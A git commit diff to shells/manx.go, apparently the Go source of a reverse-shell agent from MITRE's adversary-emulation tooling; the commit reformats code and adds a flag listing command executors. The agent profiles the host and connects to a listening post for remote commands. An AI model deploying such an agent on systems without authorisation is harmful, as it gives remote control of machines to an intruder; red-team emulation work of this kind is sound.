12b6a6896bd2e987dc2016f3bce6b345e624d4ba
amanners <amanners@mitre.org>
2020-02-06 11:26:13 -0700

    adding cmd executor
    Former-commit-id: 7e45b3f5576a51d40714cad90e2cfdc5a67400fb

--- shells/manx.go
+++ shells/manx.go
@@ -1,16 +1,16 @@
 package main
 
 import (
-   "fmt"
-   "os"
-   "os/user"
-   "runtime"
-   "flag"
-   "path/filepath"
-
-   "./util"
-   "./output"
-   "./sockets"
+	"./output"
+	"./sockets"
+	"./util"
+	"flag"
+	"fmt"
+	"os"
+	"os/user"
+	"path/filepath"
+	"runtime"
+	"strings"
 )
 
 var (
@@ -20,11 +20,11 @@ var (
    http = "http://localhost:8888"
 )
 
-func buildProfile(socket string) map[string]interface{} {
+func buildProfile(socket string, executors []string) map[string]interface{} {
 	host, _ := os.Hostname()
 	user, _ := user.Current()
-   platform := runtime.GOOS
-   architecture := runtime.GOARCH
+	platform := runtime.GOOS
+	architecture := runtime.GOARCH
 
 	profile := make(map[string]interface{})
 	profile["server"] = socket
@@ -35,24 +35,26 @@ func buildProfile(socket string) map[string]interface{} {
 	profile["location"] = os.Args[0]
 	profile["pid"] = os.Getpid()
 	profile["ppid"] = os.Getppid()
-	profile["executors"] = util.DetermineExecutors(platform, architecture)
+	profile["executors"] = strings.Join(util.DetermineExecutors(executors, platform, architecture), ",")
 	profile["exe_name"] = filepath.Base(os.Args[0])
 	return profile
 }
 
 func main() {
-   contact := flag.String("contact", "tcp", "Which contact to use")
-   socket := flag.String("socket", "0.0.0.0:5678", "The ip:port of the socket listening post")
-   http := flag.String("http", "http://127.0.0.1:8888", "The FQDN of the HTTP listening post")
-   inbound := flag.Int("inbound", 6000, "A port to use for inbound connections")
-   verbose := flag.Bool("v", false, "Enable verbose output")
-   flag.Parse()
+	var executors util.ListFlags
+	contact := flag.String("contact", "tcp", "Which contact to use")
+	socket := flag.String("socket", "0.0.0.0:5678", "The ip:port of the socket listening post")
+	http := flag.String("http", "http://127.0.0.1:8888", "The FQDN of the HTTP listening post")
+	inbound := flag.Int("inbound", 6000, "A port to use for inbound connections")
+	verbose := flag.Bool("v", false, "Enable verbose output")
+	flag.Var(&executors, "executors", "Comma separated list of executors (first listed is primary)")
+	flag.Parse()
 
-   profile := buildProfile(*socket)
+	profile := buildProfile(*socket, executors)
 
-   output.SetVerbose(*verbose)
-   output.VerbosePrint(fmt.Sprintf("[*] %s outbound socket %s, inbound at %d", *contact, *socket, *inbound))
+	output.SetVerbose(*verbose)
+	output.VerbosePrint(fmt.Sprintf("[*] %s outbound socket %s, inbound at %d", *contact, *socket, *inbound))
 
-   coms, _ := sockets.CommunicationChannels[*contact]
-   coms.Listen(*socket, *http, *inbound, profile)
+	coms, _ := sockets.CommunicationChannels[*contact]
+	coms.Listen(*socket, *http, *inbound, profile)
 }
